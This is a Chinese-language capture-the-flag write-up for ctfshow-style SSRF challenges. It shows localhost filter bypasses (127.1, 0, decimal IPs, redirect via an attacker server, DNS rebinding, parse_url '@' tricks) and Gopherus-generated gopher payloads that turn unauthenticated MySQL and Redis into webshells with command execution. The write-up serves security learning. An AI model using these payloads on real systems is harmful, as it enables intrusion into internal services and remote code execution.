[TOC]



### 一、知识点

#### Ⅰ、SSRF攻击点

```php
<?php
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
?>
```

> curl_init()：初始curl会话
> curl_setopt()：会话设置
> curl_exec()：执行curl会话,获取内容
> curl_close()：会话关闭



#### Ⅱ、gopher协议

通过gopher协议，将请求体用url编码后加上任意字符,一般是下划线，接上gopher的url即可执行GET、POST请求

```php
gopher://ip:port/_[stream]
```





### web351



<img src="https://s2.loli.net/2022/12/18/aYrXZ5GDJlPItbc.png" alt="image-20221218214527289" style="zoom:33%;" />

我们可以使用post传入url的参数：

```php
http://127.0.0.1/flag.php
```

这样的话，在服务器上，就会使用 curl_exec($ch) 函数去执行访问该url，并且返回文件中的内容，然后使用echo输出

如果我们直接去访问，肯定访问不到，因为该文件在服务器内网上



**解法二**：

我们可以使用file协议：

```php
file:///var/www/html/flag.php
或
file://127.0.0.1/var/www/html/flag.php
```

网页使用的是 linux服务器，所以网站根目录一般是 /var/www/html/ 下，file协议可以读取本地计算机文件内容，

使用该参数后，就可以将flag.php中内容给读取出来了

右键源代码：

![image-20221218215625894](https://s2.loli.net/2022/12/18/GDd2jTeFsEV51ui.png)





#### file协议：

英文原义：File Protocol 

中文释义：本地文件传输协议

 注解：File协议**主要**用于**访问本地计算机中的文件**，就如同在Windows资源管理器中打开文件一样。

应用：要使用File协议，基本的格式如下：**file:///文件路径**，比如要打开D盘images文件夹中的[pic.gif](https://links.jianshu.com/go?to=file%3A%2F%2F%2FD%3A%2Fimages%2Fpic.gif)文件，那么可以在资源管理器或IE地址栏中键入：[**file:///D:/images/pic.gif**](https://links.jianshu.com/go?to=file%3A%2F%2F%2FD%3A%2Fimages%2Fpic.gif)  然后回车。



#### file表示协议类型

://后面是机器的网络地址（IP地址）

/后面是文件夹（目录）和文件名

整体形如：

**file://机器的IP地址/目录/文件**

对于本地机器，机器的IP地址变成127.0.0.1或localhost或干脆什么也不写。

对于本地机器，根目录下的目录是Windows下的盘符，如“C:”、“D:”等。

file://127.0.0.1/C:/    本地C盘

file://localhost/D:/    本地D盘

file:///E:/            本地E盘

需要注意的是，最后面的/是必不可少的，且file协议，通常只能在Windows Explorer和Micosoft IE中使用！



### web352

<img src="https://s2.loli.net/2022/12/18/4BpJVZKdmr1LYoP.png" alt="image-20221218215711180" style="zoom:33%;" />



#### parse_url() 函数

> parse_url()是PHP中的一个内置函数，主要用于解析URL返回其组成部分，语法格式“**parse_url($url,$component=-1)**”；该函数解析一个URL ，并返回一个包含URL各种组成部分的关联数组。

示例：

```php
<?php
$url = 'http://username:password@hostname:9090/path?arg=value#anchor';

var_dump(parse_url($url));
var_dump(parse_url($url, PHP_URL_SCHEME));
var_dump(parse_url($url, PHP_URL_USER));
var_dump(parse_url($url, PHP_URL_PASS));
var_dump(parse_url($url, PHP_URL_HOST));
var_dump(parse_url($url, PHP_URL_PORT));
var_dump(parse_url($url, PHP_URL_PATH));
var_dump(parse_url($url, PHP_URL_QUERY));
var_dump(parse_url($url, PHP_URL_FRAGMENT));
?>
```

输出：

```php
array(8) {
  ["scheme"]=>
  string(4) "http"
  ["host"]=>
  string(8) "hostname"
  ["port"]=>
  int(9090)
  ["user"]=>
  string(8) "username"
  ["pass"]=>
  string(8) "password"
  ["path"]=>
  string(5) "/path"
  ["query"]=>
  string(9) "arg=value"
  ["fragment"]=>
  string(6) "anchor"
}
string(4) "http"
string(8) "username"
string(8) "password"
string(8) "hostname"
int(9090)
string(5) "/path"
string(9) "arg=value"
string(6) "anchor"
```



这一题的初衷可能是想要过滤 localhost 和 127.0.0.1  ，但是没有写过滤哪个字符串，所以我们之间用上题解法即可。

由于题目规定只能使用http/https 协议，所以我们不能继续使用file协议了

解法：

一、我们可以将127.0.0.1 进行进制转化，或者将localhost进行大小写绕过

[ip地址转换](https://tool.520101.com/wangluo/jinzhizhuanhuan/)

二、我们可以将127.0.0.1写成以下形式：

> 127.1会被解析成127.0.0.1，也就意味着为零可缺省
> 在Linux中，0也会被解析成127.0.0.1
> 127.0.0.0/8是一个环回地址网段，从**127.0.0.1 ~ 127.255.255.254都表示localhost**

```php
[POST]payload：url=http://127.1/flag.php
[POST]payload：url=http://0/flag.php
[POST]payload：url=http://127.255.255.254/flag.php
[POST]payload：url=http://2130706433/flag.php
还可以使用  句号
```





### web353



<img src="https://s2.loli.net/2022/12/18/zKfySPgin52aGb6.png" alt="image-20221218221359005" style="zoom: 33%;" />

忽略大小写，过滤了句号。 也可以使用上面的payload



### web354

<img src="https://s2.loli.net/2022/12/18/4vA82XsjhitlL9Y.png" alt="image-20221218221819060" style="zoom:33%;" />

又把数字给过滤了，

解法一：

了解到一个神奇的域名 ,会解析为127.0.0.1 :

```php
http://sudo.cc/
```

所以我们可以构造payload：

```php
?url=http://sudo.cc/flag.php
```

或者，修改自己的hosts文件，将 xx.yy  解析为 127.0.0.1即可



解法二：

可以将自己服务器作为中转，重定向到 http://127.0.0.1/flag.php

<img src="https://s2.loli.net/2022/12/18/VajgozT7FlvWsrm.png" alt="image-20221218222153353" style="zoom:33%;" />

我的服务器上的a.php 中写有如上代码，所以payload:

```php
?url=http://your-domain/a.php
```



解法三：DNS-Rebinding

> 自己去ceye.io注册绑定127.0.0.1然后记得前面加r
>
> url=http://r.xxxzc8.ceye.io/flag.php

查看 profile

如果 ceye 域名中有 1，这题就用不了这种方法了



### web355

<img src="https://s2.loli.net/2022/12/18/Q6upFmSZbWNGUoa.png" alt="image-20221218222908784" style="zoom:33%;" />

限制域名长度<=5 ,我们可以使用 127.1

```php
http://127.1/flag.php
```



### web356

<img src="https://s2.loli.net/2022/12/18/KIAQcf6MUZTDJqm.png" alt="image-20221218223054987" style="zoom:33%;" />

限制域名长度<=3 ,我们可以使用 0

```php
http://0/flag.php
```



### web357

![image-20221218223321644](https://s2.loli.net/2022/12/18/8ldBVJEhPv6jnwe.png)



####  gethostbyname()

​	返回 服务器IP 网址



#### filter_var() 

函数通过指定的过滤器过滤变量。

如果成功，则返回已过滤的数据，如果失败，则返回 false。

![image-20221218223628733](https://s2.loli.net/2022/12/18/BskCMhXcoIVWTzP.png)



#### IP地址中的保留地址

<img src="https://s2.loli.net/2022/12/18/WERVgrKSLs7zN2l.png" alt="image-20221218223726729" style="zoom: 33%;" />



即，主机名解析的 IP 不能是保留地址或者是内网 IP。

我们可以使用前面的写法，把自己的服务器重定向即可，自己的服务器ip不在过滤范围内

```php
?url=http://your-domain/a.php
```





### web358

<img src="https://s2.loli.net/2022/12/18/JUtIKNZBVl6yjO4.png" alt="image-20221218224123600" style="zoom:33%;" />

这一题正则匹配的意思是：url 以http://ctf. 开始   以show 结束。

我们可以借助 parse_url() 函数的特性，@后面的为域名hostname

于是，我们构造：

```php
?url=http://ctf.@127.0.0.1/flag.php?show
```



### web359

打无密码的mysql

> 为什么是无密码呢？
>
> https://paper.seebug.org/510/
>
> MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。



我们点击login时使用bp抓包：

<img src="https://s2.loli.net/2022/12/18/r75ywhI2os6xfXO.png" alt="image-20221218230945658" style="zoom: 25%;" />

发现请求体中，有一个类似url的字符串，可以对该地址进行请求



一般 SSRF 打内网应用主要还是通过协议，比如用的比较多的是 **gopher**

具体怎么做呢？

细心的同学可能发现，无论是用 gopher 攻击 redis、mysql、还是 ftp，这些主要都是基于 tcp 协议为主。这和 **gopher 协议的基本格式**有关

```php
gopher://<host>:<port>/<gopher-path>_后接TCP数据流
```

因为，如果想要打 MySQL 就需要知道 MySQL 通信时的 TCP 数据流，才能知道要怎么和 MySQL 通信，这里可以通过 Wireshark 抓包来分析

可以参考下面链接的 0x02 mysql协议分析部分

https://www.freebuf.com/articles/web/159342.html

不过这里有个更好用的工具 Gopherus

https://github.com/tarunkant/Gopherus

我们在kali中安装它

<img src="https://s2.loli.net/2022/12/18/m9JyH83DXzd5QVR.png" alt="image-20221218231319217" style="zoom:33%;" />

他包含常见的应用 gopher 数据包的格式构造， 原理也是通过 Wireshark 抓包分析，然后写脚本。

注意使用 python2

```python
python2 gopherus.py --exploit mysql
```

依次输入用户和要执行的SQL语句：

![image-20221218231634305](https://s2.loli.net/2022/12/18/My8nODKILYVk25j.png)



当然，除了满足MySQL未授权外，还需要MySQL开启允许导出文件以及知道网站根目录，本漏洞才能成功利用，缺一不可。

这个 `/var/www/html` 目录是如何知道的呢？应该是爆破的…

生成的 POC 里，**`_` 字符后面的内容还要 URL编码一次**，因为 PHP接收到POST或GET请求数据，会*自动进行一次URL解码*，然后，比如 %00 解码后，PHP会直接截断。。



二次url编码：

![image-20221218232306965](https://s2.loli.net/2022/12/18/XgpuxK2GLl3iOnd.png)

进行拼接：

```php
gopher://127.0.0.1:3306/_
```



然后发包：

<img src="https://s2.loli.net/2022/12/18/WvVDKugAPMJraR1.png" alt="image-20221218232512652" style="zoom:25%;" />

然后访问 /c.php 并且使用post传参进行命令执行

```php
c=system('cat /flag.txt');
```



### web360

打redis，与上题类似，只不过更换gopherus的端口号

<img src="https://s2.loli.net/2022/12/18/QxtMnkRbjireugV.png" alt="image-20221218232921937" style="zoom:50%;" />

![image-20221218233054267](https://s2.loli.net/2022/12/18/91eiWRysfGJCzbc.png)

将 _ 后的参数再进行url编码：

![image-20221218233158416](https://s2.loli.net/2022/12/18/fnzPFJXbv5CTsQc.png)

与前面拼接后，发包

![image-20221218233455657](https://s2.loli.net/2022/12/18/ebyRL1uzFDnPNJo.png)

然后访问 /shell.php  get参数名为cmd进行命令执行